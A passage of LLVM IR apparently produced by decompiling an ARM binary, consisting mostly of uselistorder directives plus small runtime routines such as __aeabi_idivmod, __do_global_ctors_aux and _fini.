  uselistorder i32 %v1_17344, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_17340, { 1, 0 }
  uselistorder i32 %v1_17348, { 1, 2, 0, 3 }
  uselistorder i32 %v4_17334, { 1, 0 }
  uselistorder i32 %v4_17330, { 2, 1, 0 }
  uselistorder i32 %v1_17334, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_1733c.pr40, { 1, 2, 0, 5, 4, 3 }
  uselistorder i1 %v3_17308, { 1, 0 }
  uselistorder i32 %v1_173c0, { 5, 1, 6, 7, 3, 2, 0, 4, 8, 9, 10, 11 }
  uselistorder i32 %v2_172ec, { 1, 0, 2 }
  uselistorder i32 %v0_172ec, { 3, 2, 1, 4, 5, 6, 0 }
  uselistorder i32 ()* @__aeabi_ldiv0, { 3, 2, 1, 0 }
  uselistorder i32* @lr, { 46, 48, 49, 50, 53, 54, 55, 3, 57, 58, 59, 60, 61, 17, 18, 19, 20, 21, 22, 23, 62, 69, 70, 71, 72, 73, 74, 75, 83, 25, 24, 0, 26, 27, 1, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 4, 102, 103, 104, 5, 105, 106, 107, 6, 108, 109, 110, 111, 112, 113, 114, 115, 65, 28, 29, 30, 7, 32, 33, 31, 84, 85, 86, 116, 47, 79, 117, 118, 119, 12, 13, 14, 15, 87, 88, 89, 120, 51, 52, 81, 82, 34, 35, 76, 77, 78, 56, 63, 16, 66, 67, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 2, 64, 10, 11, 68, 80, 90, 91, 8, 9 }
  uselistorder i32 3, { 68, 44, 26, 27, 70, 21, 71, 72, 22, 73, 74, 13, 64, 0, 29, 28, 45, 3, 2, 1, 4, 75, 30, 5, 6, 14, 7, 8, 46, 47, 82, 48, 49, 50, 51, 52, 53, 65, 11, 31, 66, 12, 58, 83, 17, 59, 79, 80, 23, 78, 15, 76, 16, 67, 9, 10, 54, 24, 55, 25, 81, 56, 19, 32, 60, 61, 20, 62, 33, 63, 57, 36, 35, 34, 43, 69, 37, 77, 38, 39, 40, 41, 42, 18 }
  uselistorder i32 15, { 2, 1, 5, 3, 7, 0, 4, 6 }
  uselistorder i32 256, { 2, 3, 4, 5, 6, 7, 147, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 0, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 144, 63, 145, 64, 146, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 140, 1, 77, 78, 81, 80, 79, 84, 83, 82, 85, 86, 87, 88, 89, 90, 148, 91, 92, 93, 139, 98, 94, 95, 99, 96, 97, 100, 105, 101, 102, 104, 103, 106, 108, 107, 141, 109, 142, 111, 110, 112, 113, 114, 117, 115, 116, 118, 119, 120, 122, 121, 123, 124, 125, 128, 126, 127, 129, 130, 132, 131, 133, 134, 135, 136, 137, 138, 143 }
  uselistorder i32 128, { 11, 6, 7, 9, 5, 18, 0, 20, 21, 1, 19, 8, 14, 15, 2, 3, 10, 16, 17, 4, 13, 12 }
  uselistorder i32 255, { 7, 10, 1, 9, 0, 8, 4, 2, 3, 5, 6 }
  uselistorder i32 65536, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 13, 9, 14, 10, 15, 11, 16, 12, 17, 18, 19, 23, 20, 24, 21, 25, 22, 26, 28, 27, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 75, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 68, 69, 67, 70, 72, 73, 71, 74, 76 }
  uselistorder i32 32768, { 2, 1, 0, 4, 3 }
  uselistorder i32 65535, { 2, 1, 3, 0 }
  uselistorder i32 31, { 15, 10, 4, 12, 2, 1, 0, 5, 7, 6, 8, 3, 13, 14, 11, 9 }
  uselistorder i32 4, {}
  uselistorder i32 2, { 2, 119, 3, 4, 5, 6, 7, 45, 8, 148, 68, 69, 150, 110, 111, 149, 70, 151, 152, 153, 154, 155, 44, 85, 125, 9, 127, 126, 156, 157, 158, 10, 46, 47, 48, 49, 50, 51, 134, 135, 112, 113, 114, 11, 115, 52, 175, 176, 74, 177, 178, 55, 179, 54, 180, 53, 161, 136, 43, 137, 138, 12, 139, 140, 86, 87, 129, 88, 130, 89, 131, 13, 56, 14, 116, 71, 128, 42, 15, 181, 72, 163, 16, 90, 164, 165, 17, 91, 166, 167, 82, 120, 0, 18, 19, 20, 92, 57, 59, 58, 60, 61, 62, 63, 76, 64, 77, 65, 66, 159, 160, 141, 142, 83, 21, 22, 23, 117, 24, 84, 143, 78, 75, 25, 144, 145, 146, 162, 26, 118, 1, 27, 28, 29, 30, 31, 32, 33, 34, 35, 121, 36, 37, 38, 39, 40, 93, 73, 94, 79, 132, 133, 95, 80, 96, 100, 122, 99, 123, 98, 97, 124, 109, 101, 147, 102, 103, 168, 169, 170, 104, 171, 105, 106, 107, 174, 81, 172, 41, 173, 67, 108 }
  uselistorder i32 16, { 3, 22, 4, 5, 1, 6, 7, 86, 87, 88, 0, 89, 90, 8, 9, 91, 92, 10, 93, 94, 95, 96, 63, 64, 106, 107, 30, 31, 32, 113, 33, 114, 115, 34, 116, 117, 35, 118, 119, 120, 121, 122, 123, 97, 101, 102, 65, 66, 36, 67, 68, 69, 70, 71, 72, 73, 74, 98, 37, 75, 27, 57, 38, 54, 84, 55, 108, 109, 124, 25, 103, 104, 76, 77, 78, 79, 80, 81, 50, 99, 100, 56, 105, 24, 11, 12, 13, 14, 15, 16, 23, 17, 18, 2, 19, 20, 28, 40, 41, 58, 59, 60, 42, 61, 62, 43, 39, 44, 82, 83, 51, 52, 45, 53, 85, 26, 29, 46, 110, 111, 47, 112, 21, 48, 49 }
  uselistorder i32 268435455, { 2, 3, 0, 4, 1, 5 }
  uselistorder i32 8, { 51, 24, 3, 4, 14, 5, 107, 108, 109, 110, 0, 1, 111, 112, 113, 114, 115, 6, 116, 58, 44, 45, 52, 117, 118, 119, 120, 20, 121, 74, 139, 150, 36, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 37, 122, 75, 76, 77, 78, 79, 80, 81, 82, 83, 22, 84, 53, 85, 86, 87, 123, 124, 125, 167, 25, 59, 7, 106, 137, 60, 61, 35, 143, 142, 140, 141, 63, 64, 65, 144, 145, 146, 147, 148, 149, 8, 134, 135, 2, 166, 40, 41, 38, 39, 16, 17, 28, 29, 42, 168, 88, 126, 127, 89, 90, 54, 91, 92, 93, 94, 21, 95, 48, 49, 96, 97, 98, 43, 99, 100, 101, 102, 27, 18, 19, 103, 104, 50, 128, 129, 62, 130, 131, 23, 132, 133, 9, 10, 55, 26, 11, 12, 15, 13, 66, 67, 68, 46, 69, 70, 71, 72, 47, 73, 105, 34, 33, 32, 56, 57, 31, 30, 136, 138 }
  uselistorder i32 536870912, { 0, 2, 1 }
  uselistorder i1 true, { 0, 1, 2, 45, 48, 3, 4, 6, 5, 7, 51, 49, 8, 9, 10, 11, 12, 13, 50, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 28, 29, 26, 27, 30, 31, 44, 52, 32, 33, 34, 46, 35, 36, 37, 38, 47, 39, 40, 41, 42, 43 }
  uselistorder i32 %arg2, { 2, 3, 4, 0, 1 }
  uselistorder label %bb114, { 1, 0 }
  uselistorder label %bb112, { 1, 0 }
  uselistorder label %.thread21, { 2, 0, 1 }
  uselistorder label %.thread20, { 2, 0, 1 }
  uselistorder label %bb106, { 1, 0 }
  uselistorder label %bb103, { 1, 0 }
  uselistorder label %.thread16, { 0, 1, 2, 3, 5, 4 }
  uselistorder label %dec_label_pc_17394, { 1, 0 }
  uselistorder label %thread-pre-split12, { 0, 2, 1 }
  uselistorder label %.thread10, { 2, 0, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %dec_label_pc_17350, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1733cthread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
  uselistorder label %bb86, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
}

define i32 @__aeabi_idivmod(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_17414 = sdiv i32 %arg1, %arg2
  ret i32 %v2_17414
}

define i32 @__do_global_ctors_aux(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1742c = load i32, i32* @global_var_22338.523, align 4
  %v7_17430 = icmp eq i32 %v3_1742c, -1
  %v3_17434 = load i32, i32* @r4, align 4
  store i32 %v3_17434, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i32* @global_var_22338.523 to i32), i32* %r4.global-to-local, align 4
  br i1 %v7_17430, label %bb, label %.preheader

bb:                                               ; preds = %entry
  store i32 %v3_17434, i32* %r4.global-to-local, align 4
  %v9_1743c = load i32, i32* @r0, align 4
  ret i32 %v9_1743c

.preheader:                                       ; preds = %entry, %.preheader
  %v0_17444 = phi i32 [ %v3_17448, %.preheader ], [ %v3_1742c, %entry ]
  call void @__pseudo_branch(i32 %v0_17444)
  %v0_17448 = load i32, i32* %r4.global-to-local, align 4
  %v1_17448 = add i32 %v0_17448, -4
  %v2_17448 = inttoptr i32 %v1_17448 to i32*
  %v3_17448 = load i32, i32* %v2_17448, align 4
  store i32 %v1_17448, i32* %r4.global-to-local, align 4
  %v3_1744c = icmp eq i32 %v3_17448, -1
  br i1 %v3_1744c, label %dec_label_pc_17454, label %.preheader

dec_label_pc_17454:                               ; preds = %.preheader
  %v2_17454 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_17454, i32* %r4.global-to-local, align 4
  %v8_17454 = load i32, i32* @r0, align 4
  ret i32 %v8_17454

; uselistorder directives
  uselistorder i32 %v3_17448, { 1, 0 }
  uselistorder i32 %v3_1742c, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32 -4, { 67, 18, 19, 59, 20, 28, 68, 69, 70, 12, 29, 30, 31, 71, 72, 73, 13, 32, 33, 34, 74, 75, 76, 14, 35, 36, 77, 27, 26, 78, 79, 80, 25, 24, 23, 22, 37, 38, 39, 40, 41, 9, 42, 10, 43, 11, 81, 21, 44, 16, 60, 0, 51, 52, 53, 54, 64, 55, 45, 46, 56, 57, 58, 65, 66, 47, 17, 15, 61, 62, 63, 48, 49, 1, 50, 3, 4, 5, 6, 7, 8, 2 }
  uselistorder i32 -1, { 180, 0, 181, 1, 57, 58, 2, 299, 182, 271, 80, 300, 153, 3, 301, 81, 4, 5, 82, 255, 6, 7, 8, 88, 86, 83, 256, 135, 136, 87, 85, 84, 157, 257, 302, 183, 184, 77, 44, 9, 89, 272, 185, 186, 273, 274, 90, 303, 91, 187, 64, 92, 11, 12, 159, 59, 60, 158, 309, 66, 65, 61, 62, 188, 138, 139, 189, 190, 10, 310, 275, 191, 78, 45, 192, 276, 13, 46, 193, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 194, 305, 307, 195, 70, 277, 197, 278, 279, 79, 71, 72, 280, 281, 282, 283, 284, 73, 160, 285, 143, 196, 161, 286, 318, 319, 198, 162, 163, 14, 287, 199, 200, 288, 289, 164, 93, 323, 94, 329, 95, 269, 96, 349, 97, 350, 98, 351, 99, 352, 100, 324, 101, 353, 15, 16, 201, 17, 102, 260, 261, 202, 203, 204, 268, 165, 166, 18, 258, 69, 205, 19, 259, 206, 167, 207, 20, 21, 68, 47, 48, 208, 209, 210, 63, 262, 211, 263, 22, 23, 103, 311, 104, 312, 105, 270, 106, 330, 107, 320, 108, 316, 109, 267, 110, 317, 168, 313, 111, 314, 212, 112, 213, 290, 214, 215, 216, 113, 217, 218, 219, 220, 221, 222, 49, 50, 223, 152, 114, 224, 24, 67, 74, 75, 306, 225, 291, 226, 169, 292, 51, 293, 294, 170, 25, 227, 228, 140, 144, 142, 26, 145, 29, 27, 28, 146, 171, 295, 296, 229, 30, 52, 53, 297, 308, 115, 304, 116, 331, 117, 298, 118, 354, 355, 119, 264, 120, 321, 121, 322, 122, 265, 123, 325, 124, 356, 125, 332, 126, 359, 127, 326, 128, 333, 129, 315, 130, 327, 131, 328, 132, 266, 133, 357, 76, 358, 54, 55, 230, 231, 232, 233, 234, 235, 141, 134, 172, 236, 237, 238, 239, 35, 36, 37, 31, 32, 33, 34, 173, 174, 240, 241, 242, 38, 243, 244, 56, 39, 40, 137, 175, 176, 41, 245, 246, 154, 155, 156, 42, 247, 147, 148, 149, 150, 151, 43, 248, 249, 250, 251, 252, 253, 254, 177, 178, 179 }
  uselistorder i32* @global_var_22338.523, { 1, 0 }
  uselistorder i32 1, { 515, 222, 953, 349, 954, 960, 961, 962, 963, 964, 965, 966, 516, 286, 284, 285, 281, 280, 282, 283, 967, 445, 968, 969, 517, 201, 200, 199, 196, 198, 197, 970, 264, 971, 389, 972, 977, 978, 424, 979, 980, 981, 446, 447, 982, 983, 518, 287, 288, 289, 290, 519, 984, 520, 238, 237, 236, 239, 985, 521, 204, 205, 986, 987, 988, 989, 522, 202, 203, 824, 825, 826, 827, 828, 829, 830, 831, 832, 525, 524, 523, 180, 181, 182, 833, 834, 835, 836, 837, 529, 528, 527, 526, 166, 165, 171, 167, 170, 169, 168, 172, 173, 164, 174, 390, 990, 991, 391, 992, 993, 994, 995, 996, 448, 997, 998, 999, 1000, 1002, 531, 530, 23, 21, 25, 22, 26, 27, 28, 24, 366, 1007, 1003, 1004, 1005, 1006, 410, 532, 93, 94, 95, 1008, 533, 867, 868, 869, 1009, 1010, 1011, 1012, 1013, 1014, 1015, 1016, 1017, 1018, 1019, 1020, 1021, 1022, 1023, 534, 162, 163, 157, 158, 159, 160, 161, 374, 41, 1024, 1025, 1026, 1027, 1028, 1029, 535, 292, 293, 294, 291, 536, 263, 375, 449, 888, 537, 32, 30, 29, 33, 31, 1030, 1031, 450, 538, 139, 140, 137, 141, 138, 889, 890, 540, 539, 296, 298, 297, 295, 299, 541, 155, 1038, 392, 1037, 376, 354, 1040, 393, 1039, 0, 1043, 1044, 1045, 1046, 544, 543, 542, 250, 249, 1086, 1087, 1088, 1089, 1090, 425, 1091, 1092, 426, 1094, 451, 1095, 418, 419, 429, 1, 427, 428, 1096, 1093, 452, 1097, 414, 551, 550, 503, 549, 548, 504, 547, 546, 545, 367, 413, 1161, 1162, 1163, 1164, 1165, 394, 552, 101, 870, 871, 872, 553, 302, 303, 301, 300, 891, 377, 892, 1204, 378, 1205, 1206, 1207, 1208, 1209, 1210, 1211, 1212, 1213, 1214, 1215, 1216, 505, 555, 554, 12, 13, 14, 15, 10, 9, 8, 11, 17, 16, 453, 1047, 1048, 1063, 1064, 1065, 1066, 556, 506, 19, 18, 20, 379, 395, 893, 454, 894, 895, 455, 363, 396, 360, 420, 421, 896, 456, 897, 898, 899, 900, 397, 901, 350, 902, 903, 457, 904, 905, 569, 568, 567, 566, 565, 564, 563, 562, 561, 560, 559, 558, 557, 507, 82, 76, 79, 81, 75, 73, 74, 86, 78, 77, 72, 70, 71, 80, 85, 83, 84, 1148, 1149, 508, 570, 64, 62, 67, 69, 65, 66, 63, 68, 906, 907, 908, 909, 361, 910, 911, 912, 571, 149, 150, 147, 151, 148, 913, 914, 572, 235, 1049, 1050, 1051, 1052, 1053, 107, 106, 104, 105, 103, 102, 108, 109, 915, 574, 573, 175, 176, 177, 398, 430, 577, 576, 575, 578, 304, 579, 227, 228, 580, 206, 581, 305, 582, 273, 583, 306, 584, 307, 585, 308, 586, 215, 587, 2, 591, 590, 589, 588, 131, 132, 458, 592, 399, 459, 593, 223, 594, 595, 841, 600, 599, 598, 597, 596, 216, 217, 220, 219, 218, 1177, 1178, 603, 602, 601, 233, 604, 368, 861, 862, 362, 863, 605, 337, 341, 336, 338, 340, 342, 339, 864, 369, 838, 606, 111, 113, 114, 112, 115, 271, 270, 955, 353, 400, 956, 608, 607, 96, 97, 100, 98, 99, 609, 38, 34, 40, 36, 35, 37, 39, 610, 88, 90, 89, 91, 92, 87, 611, 612, 613, 615, 614, 1217, 401, 618, 617, 616, 310, 309, 619, 254, 255, 253, 256, 142, 143, 144, 145, 620, 243, 244, 242, 241, 621, 622, 312, 311, 402, 1181, 623, 213, 214, 460, 461, 364, 627, 626, 625, 624, 260, 259, 380, 628, 313, 629, 221, 630, 135, 631, 268, 632, 269, 633, 314, 634, 208, 635, 234, 462, 1098, 365, 1099, 1100, 463, 1119, 639, 638, 637, 636, 116, 118, 119, 117, 640, 641, 1150, 1151, 315, 643, 642, 316, 317, 1218, 644, 1139, 1140, 1141, 1142, 3, 973, 974, 975, 976, 916, 917, 645, 318, 1124, 1125, 1126, 1127, 1128, 1129, 1130, 381, 918, 1101, 1102, 1103, 1104, 1105, 1106, 1107, 1108, 1109, 1110, 1111, 1112, 1113, 1114, 1115, 1116, 1117, 1118, 211, 209, 210, 212, 858, 355, 265, 266, 267, 382, 1001, 1042, 1041, 812, 813, 814, 815, 816, 817, 818, 1222, 190, 191, 188, 189, 919, 195, 194, 464, 646, 1070, 1067, 1068, 1069, 356, 383, 184, 187, 183, 185, 186, 1054, 1058, 1059, 1060, 1061, 1062, 647, 125, 123, 127, 124, 128, 126, 403, 1055, 1056, 465, 1057, 649, 648, 229, 230, 231, 651, 650, 251, 653, 652, 257, 258, 842, 655, 654, 130, 129, 415, 920, 467, 921, 922, 404, 405, 923, 924, 468, 925, 927, 928, 929, 469, 931, 406, 932, 930, 466, 933, 470, 934, 416, 935, 936, 926, 659, 658, 657, 656, 42, 48, 44, 49, 46, 43, 50, 51, 45, 47, 937, 660, 319, 324, 320, 322, 323, 321, 661, 226, 225, 938, 939, 940, 662, 60, 61, 417, 370, 942, 371, 943, 407, 944, 945, 947, 357, 948, 471, 949, 372, 946, 408, 670, 669, 668, 667, 666, 665, 664, 663, 56, 59, 58, 57, 472, 384, 671, 53, 54, 55, 941, 431, 509, 672, 325, 473, 839, 840, 673, 327, 326, 328, 1219, 432, 1220, 1221, 674, 330, 329, 272, 1071, 1072, 1073, 1074, 1075, 1076, 1077, 1078, 1079, 1080, 1081, 1082, 1083, 1084, 385, 1085, 677, 676, 675, 333, 332, 331, 335, 334, 679, 678, 680, 1032, 1033, 1034, 1035, 1036, 683, 682, 681, 120, 121, 1166, 684, 110, 685, 122, 686, 133, 134, 687, 274, 688, 252, 689, 248, 690, 275, 691, 247, 136, 692, 343, 232, 693, 245, 694, 344, 695, 696, 697, 345, 698, 346, 699, 224, 700, 347, 348, 246, 433, 1122, 1123, 434, 1182, 1183, 351, 1184, 843, 358, 373, 844, 845, 846, 352, 476, 847, 848, 849, 850, 851, 852, 853, 854, 474, 475, 422, 477, 855, 707, 706, 705, 704, 703, 702, 701, 856, 857, 714, 713, 712, 711, 710, 510, 709, 708, 859, 860, 716, 715, 865, 866, 478, 479, 717, 873, 874, 875, 876, 877, 878, 480, 722, 721, 720, 719, 718, 262, 261, 879, 880, 881, 882, 883, 481, 884, 885, 886, 887, 729, 728, 727, 726, 725, 724, 723, 179, 178, 950, 951, 733, 732, 731, 730, 952, 739, 738, 737, 736, 735, 734, 957, 819, 820, 483, 821, 482, 822, 823, 811, 958, 959, 748, 747, 746, 745, 744, 743, 742, 741, 740, 154, 153, 152, 484, 485, 752, 751, 750, 749, 437, 1120, 753, 192, 193, 755, 754, 4, 486, 1121, 411, 757, 756, 435, 1131, 487, 488, 1133, 1132, 489, 760, 759, 758, 438, 1134, 1135, 490, 491, 492, 1143, 511, 1136, 493, 761, 436, 494, 1137, 495, 1138, 767, 766, 765, 764, 763, 762, 439, 1144, 1145, 440, 768, 769, 1146, 496, 1147, 772, 771, 770, 774, 773, 409, 1152, 1153, 1154, 497, 359, 1155, 1156, 1157, 498, 1158, 777, 776, 775, 512, 1159, 778, 240, 1160, 513, 146, 442, 1167, 1168, 441, 1169, 1170, 443, 444, 1171, 1172, 779, 1173, 5, 6, 1176, 1174, 1175, 780, 499, 784, 783, 782, 781, 1179, 1180, 786, 785, 790, 789, 788, 787, 793, 792, 791, 795, 794, 1185, 1186, 500, 1196, 1197, 412, 1198, 798, 797, 796, 423, 7, 802, 801, 800, 799, 387, 1187, 1188, 1189, 386, 1190, 1194, 1195, 501, 804, 803, 502, 1191, 1192, 1193, 806, 805, 156, 1199, 1200, 807, 514, 52, 388, 1201, 1202, 808, 276, 1203, 207, 809, 810, 279, 278, 277 }
  uselistorder label %.preheader, { 1, 0 }
}

define i32 @call___do_global_ctors_aux() local_unnamed_addr {
entry:
  %v5_17460 = load i32, i32* @r0, align 4
  ret i32 %v5_17460

; uselistorder directives
  uselistorder i32* @r0, { 17, 18, 19, 163, 20, 170, 171, 172, 173, 176, 174, 175, 21, 56, 57, 177, 178, 7, 179, 180, 135, 136, 137, 181, 182, 189, 203, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 129, 130, 131, 132, 23, 25, 201, 26, 138, 27, 139, 140, 141, 28, 267, 268, 269, 46, 259, 270, 271, 52, 53, 54, 55, 29, 39, 40, 41, 66, 67, 49, 272, 273, 85, 30, 164, 165, 166, 167, 168, 169, 58, 59, 60, 61, 62, 247, 248, 275, 31, 32, 262, 33, 261, 68, 50, 69, 34, 263, 274, 70, 35, 236, 237, 238, 239, 240, 241, 242, 243, 22, 252, 44, 142, 143, 144, 24, 195, 196, 197, 198, 199, 200, 36, 190, 191, 192, 193, 71, 202, 72, 145, 146, 147, 3, 37, 148, 149, 4, 6, 0, 1, 150, 151, 5, 152, 153, 154, 38, 155, 156, 157, 2, 158, 194, 63, 64, 65, 277, 278, 204, 205, 206, 207, 208, 209, 210, 211, 159, 160, 183, 184, 185, 186, 187, 188, 42, 43, 73, 276, 45, 47, 48, 8, 249, 9, 265, 10, 266, 12, 11, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 133, 134, 161, 162, 244, 245, 246, 250, 251, 253, 254, 255, 256, 257, 258, 260, 264, 13, 14, 15, 16, 51 }
}

define i32 @_fini() local_unnamed_addr {
entry:
  %v3_17468 = load i32, i32* @r4, align 4
  %v0_17470 = call i32 @__do_global_dtors_aux()
  call void @__pseudo_branch(i32 %v3_17468)
  ret i32 %v0_17470

; uselistorder directives
  uselistorder void (i32)* @__pseudo_branch, { 1, 13, 7, 5, 6, 18, 19, 15, 16, 17, 0, 20, 8, 3, 9, 4, 10, 11, 12, 2, 14 }
  uselistorder i32 0, { 0, 1214, 1215, 1216, 1217, 112, 1218, 172, 1219, 1220, 1221, 1222, 1223, 1224, 1225, 173, 795, 798, 796, 797, 1226, 1227, 1228, 1229, 1230, 1231, 1242, 47, 91, 1243, 1244, 1245, 1246, 1247, 1248, 1257, 1258, 1249, 1250, 1251, 1252, 1253, 1254, 1255, 1256, 1259, 799, 1007, 1008, 1271, 355, 356, 1262, 1263, 174, 1264, 1265, 1267, 1266, 1268, 1269, 293, 1270, 168, 169, 170, 1272, 1260, 1261, 79, 80, 1273, 1275, 1276, 1274, 1277, 1278, 1279, 1280, 104, 1281, 1282, 105, 1283, 106, 1284, 107, 1285, 177, 841, 175, 842, 843, 844, 176, 845, 92, 93, 846, 178, 847, 357, 31, 358, 848, 849, 294, 179, 359, 360, 850, 180, 1286, 1287, 1288, 1293, 181, 1289, 247, 361, 1294, 362, 48, 49, 50, 51, 128, 129, 182, 183, 1295, 130, 1296, 301, 300, 299, 1, 100, 52, 961, 1297, 1298, 962, 297, 1009, 184, 1299, 1300, 1301, 1302, 1303, 1010, 1011, 32, 1012, 1013, 131, 1014, 1015, 185, 1304, 1305, 1306, 2, 1307, 1308, 1016, 186, 1017, 1018, 1019, 1020, 1021, 1022, 1309, 187, 302, 1310, 1317, 1318, 363, 1319, 1320, 1321, 1322, 1323, 1324, 1325, 1326, 53, 1328, 1327, 94, 1351, 1352, 364, 1386, 1372, 1373, 1374, 4, 3, 306, 291, 292, 298, 1375, 1376, 1378, 1379, 132, 242, 1381, 365, 1382, 1383, 5, 1384, 1385, 1387, 366, 307, 1380, 1377, 1388, 1389, 188, 1390, 1391, 6, 1458, 1459, 1460, 1461, 190, 189, 1462, 191, 963, 964, 7, 800, 1023, 54, 133, 1024, 1025, 248, 8, 801, 250, 1026, 55, 134, 1027, 1028, 249, 1539, 1540, 1541, 1542, 1545, 1546, 1547, 1548, 1549, 1550, 1551, 1552, 1543, 1544, 1553, 1554, 1555, 1556, 1557, 1558, 1559, 1560, 33, 1561, 1562, 1563, 1564, 34, 1565, 1566, 35, 1567, 1568, 36, 1569, 1570, 1571, 1572, 1573, 1574, 1575, 1576, 1577, 1578, 1579, 1580, 1581, 1582, 1585, 1586, 1587, 1588, 1589, 1590, 1591, 1592, 1583, 1584, 1593, 1594, 1595, 1596, 1597, 1598, 1599, 1600, 37, 1601, 1602, 1603, 1604, 38, 1605, 1606, 1607, 1608, 39, 1609, 1610, 1611, 1612, 1613, 1614, 1615, 1616, 1617, 1618, 1619, 1620, 1329, 1330, 1344, 367, 368, 1345, 1346, 1029, 1030, 1031, 1032, 1033, 1034, 1035, 1036, 1037, 1038, 1039, 1040, 1041, 1042, 1043, 192, 1044, 1045, 1046, 1047, 1048, 1049, 1050, 1051, 1052, 1053, 1054, 1055, 1056, 1057, 1058, 1059, 40, 1060, 1061, 1062, 1063, 1064, 1065, 1066, 135, 103, 1067, 1068, 193, 194, 1069, 1070, 1071, 1072, 195, 1073, 1074, 1075, 1076, 1077, 1078, 1079, 1080, 1081, 41, 1082, 1083, 1084, 1085, 1086, 1087, 1088, 295, 1089, 56, 196, 1090, 197, 369, 1091, 1092, 1093, 1094, 1095, 1096, 42, 1097, 1098, 1099, 1100, 1101, 1102, 1103, 370, 1104, 1105, 1106, 1107, 198, 1108, 1109, 1110, 43, 1111, 125, 1112, 1113, 1114, 1115, 1116, 1117, 1118, 1444, 9, 1445, 1446, 1447, 802, 1448, 1449, 1450, 1451, 1452, 1453, 1120, 1119, 1121, 1122, 1123, 1124, 1125, 1126, 1127, 1128, 1129, 1130, 1131, 1132, 1133, 1134, 1135, 136, 1331, 1332, 10, 1333, 251, 1136, 252, 1137, 1138, 137, 1139, 1471, 1487, 1488, 1489, 1490, 987, 1621, 1622, 1623, 1624, 1474, 1625, 1475, 1626, 1627, 199, 1628, 110, 1629, 108, 109, 1630, 1631, 1632, 371, 372, 373, 1636, 374, 1647, 1652, 803, 253, 1653, 375, 1651, 376, 377, 11, 1633, 1634, 378, 200, 861, 308, 862, 381, 310, 309, 863, 864, 865, 866, 380, 867, 868, 379, 869, 1476, 201, 1635, 921, 922, 923, 924, 925, 926, 203, 138, 927, 928, 929, 111, 202, 930, 382, 851, 139, 852, 140, 853, 204, 1232, 1233, 1234, 1235, 12, 1410, 1411, 13, 854, 855, 804, 81, 856, 344, 857, 384, 1637, 385, 311, 1638, 1639, 1641, 1642, 383, 1493, 1495, 1496, 57, 254, 1497, 1494, 1491, 1492, 14, 870, 873, 871, 872, 255, 15, 1500, 1498, 1499, 256, 205, 874, 875, 876, 877, 1501, 1502, 386, 16, 1503, 206, 1504, 1505, 1506, 1507, 1508, 1509, 17, 18, 878, 879, 880, 881, 387, 19, 388, 1392, 1393, 792, 988, 793, 1510, 1456, 1431, 914, 1432, 1394, 1395, 207, 1396, 1400, 1401, 1402, 1403, 389, 1404, 1405, 1463, 208, 209, 1454, 390, 312, 1455, 1648, 210, 20, 211, 212, 1140, 1141, 214, 1142, 391, 213, 1143, 95, 21, 1421, 1422, 1144, 1145, 257, 22, 1146, 1397, 1398, 1399, 23, 1290, 1291, 1292, 24, 1654, 1655, 96, 215, 1147, 1148, 1149, 1150, 1151, 216, 1347, 805, 1348, 126, 141, 1334, 1335, 1342, 1339, 1340, 1341, 258, 1343, 345, 1337, 1336, 259, 1338, 882, 883, 1349, 1350, 884, 885, 1152, 1153, 1154, 1155, 1156, 142, 1157, 1158, 1159, 1160, 1161, 217, 1162, 1164, 1165, 1163, 1166, 143, 1167, 1168, 218, 1169, 219, 296, 392, 1170, 1171, 220, 221, 1172, 1173, 1174, 1175, 1176, 1177, 313, 1178, 1179, 393, 1180, 314, 1182, 226, 1184, 223, 224, 1181, 222, 1183, 1185, 1187, 145, 1188, 1189, 227, 82, 83, 1190, 1191, 144, 394, 1192, 1193, 228, 395, 1194, 1195, 225, 1196, 1197, 1198, 1199, 1200, 1201, 1202, 1203, 1204, 1205, 396, 1207, 113, 87, 1206, 1208, 1209, 1210, 25, 837, 229, 838, 124, 84, 101, 1186, 260, 858, 26, 262, 230, 860, 859, 261, 398, 397, 315, 1650, 1353, 1354, 1355, 85, 1356, 1357, 231, 1358, 1359, 1360, 1361, 1362, 1363, 1364, 1365, 1366, 1367, 1368, 1369, 1370, 171, 1211, 1371, 1311, 1312, 1313, 1314, 1315, 1316, 806, 1511, 1236, 1640, 886, 1457, 1469, 887, 1477, 1643, 114, 1644, 1537, 1649, 1478, 1538, 888, 1479, 889, 890, 891, 892, 893, 894, 895, 896, 897, 898, 1429, 1480, 1481, 899, 1645, 1646, 27, 1412, 146, 1413, 1414, 244, 